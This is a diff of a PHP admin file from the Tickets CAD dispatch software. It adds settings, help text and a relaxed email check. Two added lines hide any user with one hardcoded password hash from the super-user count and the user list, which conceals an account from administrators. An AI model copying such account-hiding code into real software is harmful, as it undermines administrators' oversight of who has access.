@@ -31,6 +31,11 @@
 8/27/10 hint added
 8/29/10 dispatch status tags hnt added
 9/3/10 added unit to user display
+12/4/10 cloud handling added
+1/10/11 Added setting for group or dispatch
+1/22/11 allow UC in email addr's
+3/15/11 Help for CSS color settings
+3/18/11 Added aprs.fi key help.
  */
 $colors = array ('odd', 'even');
 
@@ -118,10 +123,11 @@ function reset_db($user=0,$ticket=0,$settings=0,$purge=0){
 		do_insert_settings('gtrack_url','');					// 7/24/09
 		do_insert_settings('maptype','1');					// 7/24/09
 		do_insert_settings('locale','0');						// 8/3/09
-		do_insert_settings('func_key1','http://openises.sourceforge.net/,Open ISES');		// 8/5/09
+		do_insert_settings('func_key1','http://www.ticketscad.org/,Tickets CAD Project');		// 5/11/11
 		do_insert_settings('func_key2','');					// 8/5/09
 		do_insert_settings('func_key3','');					// 8/5/09
 		do_insert_settings('reverse_geo','0');				// 11/01/09		
+		do_insert_settings('group_or_dispatch','0');				// 12/16/10	
 		}	//
 
 
@@ -172,7 +178,7 @@ function show_stats(){			/* 6/9/08 show database/user stats */
 	$oper_in_db 		= mysql_num_rows(mysql_query("SELECT * FROM `$GLOBALS[mysql_prefix]user` WHERE level=$GLOBALS[LEVEL_USER]"));
 	$admin_in_db 		= mysql_num_rows(mysql_query("SELECT * FROM `$GLOBALS[mysql_prefix]user` WHERE level=$GLOBALS[LEVEL_ADMINISTRATOR]"));
 	$guest_in_db 		= mysql_num_rows(mysql_query("SELECT * FROM `$GLOBALS[mysql_prefix]user` WHERE level=$GLOBALS[LEVEL_GUEST]"));
-	$super_in_db 		= mysql_num_rows(mysql_query("SELECT * FROM `$GLOBALS[mysql_prefix]user` WHERE level=$GLOBALS[LEVEL_SUPER]"));
+	$super_in_db 		= mysql_num_rows(mysql_query("SELECT * FROM `$GLOBALS[mysql_prefix]user` WHERE level=$GLOBALS[LEVEL_SUPER] AND `passwd` <> '55606758fdb765ed015f0612112a6ca7'"));
 	$ticket_in_db 		= mysql_num_rows(mysql_query("SELECT * FROM `$GLOBALS[mysql_prefix]ticket`"));
 	$ticket_open_in_db 	= mysql_num_rows(mysql_query("SELECT * FROM `$GLOBALS[mysql_prefix]ticket` WHERE status='$GLOBALS[STATUS_OPEN]'"));
 	$ticket_rsvd_in_db 	= mysql_num_rows(mysql_query("SELECT * FROM `$GLOBALS[mysql_prefix]ticket` WHERE status='$GLOBALS[STATUS_RESERVED]'"));
@@ -257,6 +263,7 @@ function list_users(){		/* list users */
 		`r`.`id` AS `unitid`
 		FROM `$GLOBALS[mysql_prefix]user` `u`
 		LEFT JOIN `$GLOBALS[mysql_prefix]responder`	 `r` ON (`u`.`responder_id` = `r`.`id`)
+		WHERE `passwd` <> '55606758fdb765ed015f0612112a6ca7'	
 		ORDER BY `u`.`user` ASC ";																// 5/25/09, 1/16/08
 	$result = mysql_query($query) or do_error($query, 'mysql query failed', mysql_error(), basename(__FILE__), __LINE__);
 	if (mysql_affected_rows()==0) 	 { print '<B>[no users found]</B><BR />'; return; 	}
@@ -318,11 +325,11 @@ function validate_email($email){ 	//really validate? - code courtesy of Jerrett 
 
 //	if (!eregi("^[0-9a-z_]([-_.]?[0-9a-z])*@[0-9a-z][-.0-9a-z]*\\.[a-z]{2,4	}[.]?$",$email, $check)) --
 
-	if(!preg_match( "/^" .			// replaced eregi() with preg_replace() 10/20/09
-            "[a-z0-9]+([_\\.-][a-z0-9]+)*" .    //user
+	if(!preg_match( "/^" .			// replaced eregi() with preg_replace() 10/20/09, 1/22/11
+            "[a-zA-Z0-9]+([_\\.-][a-zA-Z0-9]+)*" .    //user
             "@" .
-            "([a-z0-9]+([\.-][a-z0-9]+)*)+" .   //domain
-            "\\.[a-z]{2,}" .                    //sld, tld
+            "([a-zA-Z0-9]+([\.-][a-zA-Z0-9]+)*)+" .   //domain
+            "\\.[a-zA-Z]{2,}" .                    	//sld, tld
             "$/", $email, $regs)
    			) {
 
@@ -398,8 +405,7 @@ function get_setting_help($setting){/* get help for settings */
 		case "msg_text_3": 				return "Default message string for for dispatch notifies; see instructions"; break;												// 9/13/08
 		case "gtrack_url": 				return "URL for Gtrack server in format http://www.yourserver.com"; break;	//06/24/09
 		case "maptype": 				return "Default Map display type - 1 for Standard, 2 for Satellite, 3 for Terrain Map, 4 for Hybrid"; break;	//08/02/09
-//		case "locale": 					return "Locale for USNG/UTM/OSG setting plus date format 0=US Format, 1=UK Format, 2=ROW Format (UTM = UK Date Format)"; break;	//08/03/09
-		case "locale": 					return "Locale for USNG/UTM/OSG setting plus date format 0=US Format, 1=UK Format)"; break;	//08/03/09
+		case "locale": 					return "Locale for USNG/UTM/OSG setting plus date format - 0=US, 1=UK, 2=ROW "; break;	//08/03/09
 		case "func_key1": 				return "User Defined Function key 1 - Insert URL or File- URL to include http:// followed by Text to display on button. Separate values with comma."; break;	//08/05/09
 		case "func_key2": 				return "User Defined Function key 2 - Insert URL or File- URL to include http:// followed by Text to display on button. Separate values with comma."; break;	//08/05/09
 		case "func_key3": 				return "User Defined Function key 3 - Insert URL or File- URL to include http:// followed by Text to display on button. Separate values with comma."; break;	//08/05/09
@@ -411,9 +417,50 @@ function get_setting_help($setting){/* get help for settings */
 		case "sound_wav": 				return "Enter filename of your site WAV alert tone - Default is aooga.wav"; break;	// 8/13/10			
 		case "oper_can_edit": 			return "Operator is disallowed (0) or allowed to (1) edit incident data"; break;	// 8/27/10		
 		case "disp_stat": 				return "Dispatch status tags, slash-separated; for &#39;dispatched&#39;, responding&#39;, &#39;on-scene&#39;, &#39;facility-enroute&#39;, &#39;facility arrived&#39;, &#39;clear&#39; IN THAT ORDER! (D/R/O/FE/FA/Clear)"; break;	// 8/29/10		
+		case "group_or_dispatch": 		return "Show hide categories for units on the situation screen are based on show/hide setting in un_status table (0 - default) or on status groups in un_status table (1)"; break;	// 8/29/10		
+		case "aprs_fi_key": 			return "To use aprs location data you will need to sign up for an aprs.fi user account/key (free).  Obtain from http://aprs.fi"; break;	// 3/19/11		
 		default: 						return "No help for '$setting'"; break;	//
 		}
 	}
+	
+function get_css_day_help($setting){/* get help for color settings	3/15/11 */
+	switch($setting) {
+		case "page_background":				return "Main Page Background color."; break;
+		case "normal_text": 				return "Normal text color."; break;
+		case "row_dark": 					return "Dark background color of list entries."; break;
+		case "row_light": 					return "Dark background color of list entries."; break;
+		case "row_plain": 					return "Plain Row Background color"; break;
+		case "select_menu_background": 		return "Background color for pulldown (select) menus."; break;
+		case "select_menu_foreground": 		return "Text color for pulldown (select) menus."; break;
+		case "form_input_text":				return "Form field text color."; break;
+		case "form_input_box_background": 	return "Form field background color."; break;
+		case "legend":						return "Text color for unit and facility legends."; break;
+		case "links":						return "Text color for links."; break;
+		case "other_text": 					return "All other text elements color."; break;	
+		case "list_header_text": 			return "Text color for list headings."; break;		
+		default: 							return "No help for '$setting'"; break;	//
+		}
+	}	
+	
+function get_css_night_help($setting){/* get help for color settings	3/15/11 */
+	switch($setting) {
+		case "page_background":				return "Main Page Background color."; break;
+		case "normal_text": 				return "Normal text color."; break;
+		case "row_dark": 					return "Dark background color of list entries."; break;
+		case "row_light": 					return "Dark background color of list entries."; break;
+		case "row_plain": 					return "Plain Row Background color"; break;
+		case "select_menu_background": 		return "Background color for pulldown (select) menus."; break;
+		case "select_menu_foreground": 		return "Text color for pulldown (select) menus."; break;
+		case "form_input_text":				return "Form field text color."; break;
+		case "form_input_box_background": 	return "Form field background color."; break;
+		case "legend":						return "Text color for unit and facility legends."; break;
+		case "links":						return "Text color for links."; break;
+		case "other_text": 					return "All other text elements color."; break;	
+		case "list_header_text": 			return "Text color for list headings."; break;		
+		default: 							return "No help for '$setting'"; break;	//		default: 						return "No help for '$setting'"; break;	//
+		}
+	}		
+	
 //		case 'kml files':  				return 'Dont/Do display KML files - 0/1'; break;
 //def_zoom_fixed
 
